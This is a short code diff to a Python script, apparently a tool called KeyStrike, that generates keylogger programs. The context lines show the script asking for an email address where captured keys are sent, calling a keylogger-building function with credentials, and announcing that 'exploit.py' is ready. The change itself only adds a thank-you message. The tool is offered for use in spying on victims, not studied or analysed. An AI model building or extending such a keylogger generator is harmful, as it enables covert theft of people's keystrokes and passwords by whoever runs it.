@@ -158,3 +158,4 @@ if __name__ == "__main__":
     email = input(prGreen("Enter email where you want to receive keys : "))
     generate_keylogger_exploit(username, password, email)
     print(prLightPurple("Your exploit is ready : exploit.py"))
+    print("Thank you for using KeyStrike!! If you have any problem create an issue.")
